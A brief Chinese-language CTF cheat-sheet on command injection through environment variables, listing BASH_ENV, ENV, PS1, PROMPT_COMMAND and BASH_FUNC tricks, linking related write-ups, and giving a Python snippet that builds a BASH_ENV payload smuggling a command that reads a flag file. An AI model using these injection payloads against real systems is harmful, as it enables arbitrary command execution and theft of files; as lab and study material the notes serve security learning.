## webshell 环境变量注入

[我是如何利用环境变量注入执行任意命令](https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html)
[2022 虎符 CTF-WEB 赛后复现](https://blog.csdn.net/qq_45619909/article/details/128946735)
[能源安全比赛-Gohttp](https://mp.weixin.qq.com/s/wOddOgJLRdyqK2d2LmV8Hw)

```sh
BASH_ENV：可以在bash -c的时候注入任意命令
ENV：可以在sh -i -c的时候注入任意命令
PS1：可以在sh或bash交互式环境下执行任意命令
PROMPT_COMMAND：可以在bash交互式环境下执行任意命令
BASH_FUNC_xxx%%：可以在bash -c或sh -c的时候执行任意命令
```

BASH_ENV 示例

```py
def encode(text):
    from urllib.parse import quote
    return quote(text)
data = encode('cat /home/ctf/flag')
f"BASH_ENV='$({data}>+/tmp/3.txt)'"
```
